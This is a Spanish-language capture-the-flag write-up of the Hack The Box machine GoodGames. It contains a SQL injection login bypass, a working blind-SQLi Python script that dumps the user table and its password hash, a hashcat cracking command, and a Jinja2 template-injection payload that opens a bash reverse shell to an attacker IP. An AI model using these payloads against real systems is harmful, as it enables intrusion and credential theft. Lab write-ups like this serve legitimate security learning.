# 🎮 GoodGames - HTB Writeup

## 🔍 Reconocimiento

Escaneamos todos los puertos abiertos:

```bash
nmap -p- --open -n -Pn -vvv -sS --min-rate 5000 10.10.11.130 -oG allPorts
```

![[GoodGames1.png]]

Luego analizamos los servicios y mandamos un conjunto de scripts básicos de reconocimiento:

```bash
nmap -sCV -p80 10.10.11.130 -oN target
```

![[GoodGames2.png]]

---

## 🧪 SQL Injection para Login Bypass

1. Nos creamos una cuenta y nos deslogeamos.
2. Interceptamos la petición de login con *Caido*.
3. En el campo del email usamos:
    ```
    admin' or 1=1-- -
    ```
4. En el campo de contraseña ponemos cualquier cosa.

Esto nos logueará como el usuario `admin`, entregándonos su cookie de sesión.

![[Goodgames3.png]]

Luego, ingresamos a nuestra cuenta previamente creada y **cambiamos la cookie de sesión por la de admin**.

![[Goodgames4.png]]

Con `CTRL + SHIFT + I` vamos a la pestaña de cookies y la modificamos.

![[Goodgames5.png]]

---

## 🛠️ Acceso al Panel Interno

Desde el panel de administrador, accedemos a la tuerquita (⚙️) que nos redirige a:

```
http://internal-administration.goodgames.htb/login
```

Debemos agregar el dominio en el archivo `/etc/hosts`:

```
10.10.11.130 internal-administration.goodgames.htb
```

![[Goodgames6.png]]

Una vez dentro, tenemos un **nuevo panel de login** el cual vamos a interceptar nuevamente con *Caido*.

![[Goodgames7.png]]

---

## 🐍 Script de Dump de Datos

En el nuevo login vulnerable a SQLi, vamos a usar un script en Python para dumpear los datos de las bases de datos:

```python
#!/usr/bin/env python3

from pwn import *
import requests, signal, sys, string, time


###CTRL +C###
def def_handler(sig, frame):
    print("\n\n Saliendo..\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
###Fin CTRL+C##

#Variables globales
characters = string.ascii_lowercase + "_-:,;" + string.ascii_uppercase + string.digits
main_url = "http://10.10.11.130/login"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

def sqli():

    data = ""
    p1 = log.progress("SQLI")
    p1.status("Iniciando ataque")
    time.sleep(1)
    p2 = log.progress("Data")

    for position in range(1, 500):
        for character in characters:
            payload = f"' or substring((select group_concat(schema_name) from information_schema.schemata),{position},1)='{character}'-- -" //Dumpear bases de datos
            #payload = f"' or substring((select group_concat(table_name) from information_schema.tables where table_schema='main'),{position},1)='{character}'-- -" //Dumpear tablas
            #payload = f"' or substring((select group_concat(column_name) from information_schema.columns where table_schema='main' and table_name='user'),{position},1)='{character}'-- -" //Dumpear columnas
            #payload = f"' or substring((select group_concat(name,0x3a,password) from main.user),{position},1)='{character}'-- -" #Dumpear datos finales
            post_data = {
                "email": payload,
                "password": "test"
                }

            r = requests.post(main_url, data=post_data, headers=headers)

            if "Login Success" in r.text:
                data += character
                p2.status(data)
                break


if __name__ == '__main__':
    sqli()
```

Resultados: 
![[Goodgames8.png]]
La base de datos se llama main
![[Goodgames9.png]]
Las tablas se llaman, blog, blog_comments,user
![[Goodgames10.png]]
Las columnas son, email, id, name, password
	Nosotros vamos a dumpear name y password

![[Goodgames11.png]]
Usuario: admin
Contraseña: 2b22337f218b2d82dfc3b6f77e7cb8ec


# Hashcat para cracker la contraseña 
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt 

Resultado: superadministrator
![[Goodgames12.png]]

---

# SSTI
Como funciono el {{7*\7}}  y nos dio 49, pensamos que es un SSTI      | esta capado con \ 

![[Goodgames13.png]]
	Probamos este payload, por que como en wapallyzer vemos que esta corriendo python3, asumimos que se esta puyede estar usando jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.16.6/443 0>&1"').read() }}        | El comando lo sacamos de este [articulo](https://chatgpt.com/c/68220f4f-2fec-8000-acb9-3f2f26690d56)
	Mientras nos ponemos en escucha por el puerto 443 con
	```bash
	nc -nlvp 443
	```
# Accedemos a la maquina y vemos la primera flag
![[Goodgames14.png]]
![[Goodgames15.png]]
Tenemos que tener en cuenta el home de augustus, que puede ser relevante en un futuro

# Tratamiento de la tty
```bash
scrip /dev/null -c bash
CTRL+ Z
stty raw -echo;fg
reset xterm
export SHELL=bash
export TERM=xterm
stty rows 37 columns 174
```

# Salir del contenedor a la maquina victima
Tenemos la sospecha de que estamos en un contenedor, por el nombre despues de @: root@3a453ab39d3d
Confirmamos que estamos en un contenedor usando `hostname -I` somos la ip 172.19.0.2
![[Goodgames16.png]]

Usamos el comando `mount | grep augustus` y nos dice que la particion del disco duro esta montada en /dev/sda1, lo cual no es de relevancia, en el /etc/group no figura el grupo 1000, por lo tanto pensamos que es un grupo de la maquina host. y en el comando `route -n` nos muestra que a la direccion ip 172.19.0.1 es donde va todo nuestro trafico. Asi que asumimos que es la ip de la maquina host
![[Goodgames17.png]]
Mandamos un ping a 172.19.0.1, y nos responde
![[Goodgames18.png]]

## 📝 Notas

- Intentar saltar el login mediante una inyección SQL como por ejemplo admin' or 1 = 1 -- -
   La vulnerabilidad permite acceder como el primer usuario de la base de datos, usualmente `admin`.

## Comando root -n
Nos sirve para encontrar la ip de la maquina host, estando dentro del contenedor, 

`route -n`
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         172.19.0.1      0.0.0.0         UG    0      0        0 eth0
172.19.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0

|   |   |
|---|---|
|`Destination`|`0.0.0.0` → Esta es la **ruta por defecto**: cualquier tráfico que no coincida con otra ruta irá por esta.|

|   |   |
|---|---|
|`Gateway`|`172.19.0.1` → La **puerta de enlace** o **router** al que se enviará ese tráfico.|

|           |                                                                                                                                              |
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| `Genmask` | `0.0.0.0` → Máscara para una red "catch-all" (todas las IPs).        dependiendo el contexto, 0.0.0.0 vale todas las ips, pero en general si |

|   |   |
|---|---|
|`Flags`|`UG` → `U` indica que la interfaz está **activa (up)**, y `G` que usa una **gateway**.|

|   |   |
|---|---|
|`Metric`|`0` → Prioridad de la ruta (más bajo = más prioridad).|

|   |   |
|---|---|
|`Ref`|`0` → No se usa casi nunca (referencias).|

|   |   |
|---|---|
|`Use`|`0` → Veces que se usó esta ruta (desde que se levantó la interfaz).|

|         |                                                      |
| ------- | ---------------------------------------------------- |
| `Iface` | `eth0` → Se envía por la **interfaz de red `eth0`**. |
|         |                                                      |
### Server-Side Template Injection (SSTI)
El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.
Esta vulnerabilidad, normalmente se prueba poniendo {{7\*7}} (esta capado con \) y si responde 49 lo mas probable es que se de esta vulnerabilidad 
Probamos este payload, por que como en wapallyzer vemos que esta corriendo python3, asumimos que se esta puyede estar usando jinja2


## Comando mount | grep augutus

**`/dev/sda1`**: es la partición del disco duro que está montada.
**`/home/augustus`**: es el punto de montaje, es decir, dónde en el sistema de archivos se ha montado esa partición.
**`type ext4`**: el sistema de archivos que usa esta partición es **ext4**.

**`(rw,relatime,errors=remount-ro)`**: opciones de montaje:
	**`rw`**: se puede leer y escribir (read/write).
	**`relatime`**: optimiza las escrituras al disco actualizando los tiempos de acceso de forma más eficiente.
	**`errors=remount-ro`**: si hay errores, el sistema monta la partición como de solo lectura (para evitar daños).



---

## 📚 Créditos

- Writeup oficial de HTB
- [Writeup de xdann1](https://xdann1.github.io/posts/writeup-goodgames/)